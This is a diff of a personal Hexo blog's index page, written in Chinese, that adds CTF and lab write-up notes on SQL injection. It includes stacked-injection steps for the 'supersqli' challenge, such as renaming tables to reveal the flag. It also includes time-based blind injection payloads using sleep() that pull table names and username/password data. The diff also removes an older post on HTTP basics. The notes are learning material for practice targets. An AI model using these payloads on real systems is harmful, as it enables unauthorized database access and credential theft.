@@ -112,7 +112,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -130,6 +130,93 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/02/28/ctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="cotton-star">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/02/28/ctf/" class="post-title-link" itemprop="url">ctf</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-02-28 21:00:33 / Modified: 21:11:49" itemprop="dateCreated datePublished" datetime="2024-02-28T21:00:33+08:00">2024-02-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="1-supersqli-攻防世界"><a href="#1-supersqli-攻防世界" class="headerlink" title="1.supersqli(攻防世界)"></a>1.supersqli(攻防世界)</h3><pre><code>先正常尝试
+发现1&#39;#存在sql漏洞
+然后通过1&#39;order by 2#发现只有两列
+之后使用1&#39;union select 1,2发现select被禁
+搜索发现试试使用堆叠注入和show方法
+第一步：1&#39;; show databases; # 
+成功发现数据库supersqli
+第二步：1&#39;;use supersqli;show tables;#
+发现俩表
+第三步：1&#39;;use supersqli;show columns from `1919810931114514`;# 
+打开表看看，发现flag
+
+过滤中并没有alert 和 rename，我们已经知道了words是用来回显内容的，我们把1919810931114514这个表更改名字为words,并增加相应的字段，使之回显原1919810931114514这个表的内容。
+1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
+
+1&#39; or 1=1#
+得到flag
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -252,7 +339,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-02-26 20:26:25" itemprop="dateModified" datetime="2024-02-26T20:26:25+08:00">2024-02-26</time>
+      <time title="Modified: 2024-02-27 15:01:53" itemprop="dateModified" datetime="2024-02-27T15:01:53+08:00">2024-02-27</time>
     </span>
 
   
@@ -300,8 +387,20 @@
 <h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>只需将第五关的单引号换成双引号，其余一致</p>
 <h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>id&#x3D;1’))–+</p>
 <h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>与第五关一致</p>
-<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>将单引号换成双引号。</p>
-<h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>post型<br>在用户名处判断闭合符号，然后使用联合注入</p>
+<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>界面显示一致，利用时间注入</p>
+<ol>
+<li>输入?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+</li>
+<li>输入?id&#x3D;1’ and if(length((select database()))&#x3D;8,sleep(5),1)–+ 如果长度&#x3D;8为真则页面延迟10s</li>
+<li>输入?id&#x3D;1’ and if(ascii(substr(select database())1,1))&#x3D;115,sleep(5),1)–+</li>
+<li>输入?id&#x3D;1’ and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&#x3D;* ,sleep(5),1)–+</li>
+<li>输入?id&#x3D;1’ and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&#x3D;* ,sleep(5),1)–+</li>
+<li>输入?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+</li>
+<li>输入?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+</li>
+<li>输入?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+</li>
+<li>输入?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+</li>
+</ol>
+<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>将单引号换成双引号。</p>
+<h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>post型<br>在用户名处判断闭合符号，然后使用联合注入<br>注意只有两列，因此union select 1,group_concat()即可</p>
 
       
     </div>
@@ -981,95 +1080,6 @@
 <li>形成报告</li>
 </ol>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2023/11/30/http%E5%8D%8F%E8%AE%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="cotton-star">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/11/30/http%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">Http协议</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-11-30 19:32:13" itemprop="dateCreated datePublished" datetime="2023-11-30T19:32:13+08:00">2023-11-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2023-12-03 19:25:49" itemprop="dateModified" datetime="2023-12-03T19:25:49+08:00">2023-12-03</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="Http请求信息和响应信息的格式"><a href="#Http请求信息和响应信息的格式" class="headerlink" title="Http请求信息和响应信息的格式"></a>Http请求信息和响应信息的格式</h1><p>1.请求行<br>2.请求头信息<br>3.请求主体信息（可以没有）<br>4.头信息结束后和主题信息之间要空行</p>
-<p>请求行又分三部分：<br>请求方法 请求路径 所用的协议</p>
-<p>EG:<br><em><strong>GET &#x2F;0606&#x2F;01.php HTTP&#x2F;1.1</strong></em>   请求行：<br>1.GET 就是请求方法<br>2.&#x2F;0606&#x2F;01.php 就是请求的资源<br>3.HTTP&#x2F;1.1 是请求所用的协议版本</p>
-<p><em><strong>Host: localhost</strong></em>   请求头部信息<br>                        ！！！ 这里一定要空一行<br>                        以便头信息与主体信息做区分，头信息非常丰富</p>
-<p><em><strong>HTTP&#x2F;1.1 200 OK</strong></em>   响应行：协议版本 状态码 状态文字<br><em><strong>DATE: Thu. 30 Jun 2023 12:39:02 GMT</strong></em>   响应头信息：<br>一般格式为<br>key：value<br>key：value<br>contente-length:接下来的主体长度</p>
-<p>主体</p>
-<h2 id="1-请求方法：GET-POST-PUT-DELETE-TRACE-OPTIONS"><a href="#1-请求方法：GET-POST-PUT-DELETE-TRACE-OPTIONS" class="headerlink" title="1.请求方法：GET POST PUT DELETE TRACE OPTIONS"></a>1.请求方法：GET POST PUT DELETE TRACE OPTIONS</h2><p><em><strong>POST比GET麻烦的多，需要再投信息里表明主体长度与类型</strong></em><br><em><strong>POST为向里输入</strong></em><br><em><strong>HEAD和GET基本一致，只是返回内容</strong></em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET： 用于请求访问已经被URL（统一资源标识符）识别的资源，可以通过URL传参给服务器。</span><br><span class="line"></span><br><span class="line">POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。</span><br><span class="line"></span><br><span class="line">PUT： 传输文件，报文主体中包含文件内容，保存到对应URL位置。</span><br><span class="line"></span><br><span class="line">HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URL是否有效。</span><br><span class="line"></span><br><span class="line">DELETE：删除文件，与PUT方法相反，删除对应URL位置的文件。</span><br><span class="line"></span><br><span class="line">OPTIONS：查询相应URL支持的HTTP方法。</span><br></pre></td></tr></table></figure>
-<h2 id="2-请求路径：就是URL的一部分"><a href="#2-请求路径：就是URL的一部分" class="headerlink" title="2.请求路径：就是URL的一部分"></a>2.请求路径：就是URL的一部分</h2><h2 id="3-所用协议：一般是HTTP-1-1"><a href="#3-所用协议：一般是HTTP-1-1" class="headerlink" title="3.所用协议：一般是HTTP&#x2F;1.1"></a>3.所用协议：一般是HTTP&#x2F;1.1</h2><h2 id="4-响应行：协议版本-状态码-状态文字"><a href="#4-响应行：协议版本-状态码-状态文字" class="headerlink" title="4.响应行：协议版本 状态码 状态文字"></a>4.响应行：协议版本 状态码 状态文字</h2><h3 id="状态码是用来反映服务器响应情况的"><a href="#状态码是用来反映服务器响应情况的" class="headerlink" title="状态码是用来反映服务器响应情况的"></a>状态码是用来反映服务器响应情况的</h3><p>最常见的如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br><span class="line">404 NOT FOUND</span><br></pre></td></tr></table></figure>
-<p>分类如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1XX 信息 接收到请求，继续处理</span><br><span class="line">2XX 成功 操作成功地收到，理解和接受</span><br><span class="line">3XX 重定向 为了完成请求，必须采取进一步措施</span><br><span class="line">4XX 客户端错误 请求的语法有错误或不能完全被满足</span><br><span class="line">5XX 服务端错误 服务器无法完成明显有效的请求</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">成功</span><br><span class="line">200 服务器成功返回网页</span><br><span class="line">301/2 永久/临时重定向</span><br><span class="line">304 Not Modified 未修改</span><br><span class="line">307 重定向之后保持原有的请求数据</span><br><span class="line">失败</span><br><span class="line">404 请求的网页不存在</span><br><span class="line">503 服务器暂时不可用</span><br><span class="line">500 服务器内部错误</span><br></pre></td></tr></table></figure>
-
-<h3 id="状态文字是用来描述状态码的，便于人观察"><a href="#状态文字是用来描述状态码的，便于人观察" class="headerlink" title="状态文字是用来描述状态码的，便于人观察"></a>状态文字是用来描述状态码的，便于人观察</h3>
       
     </div>
 
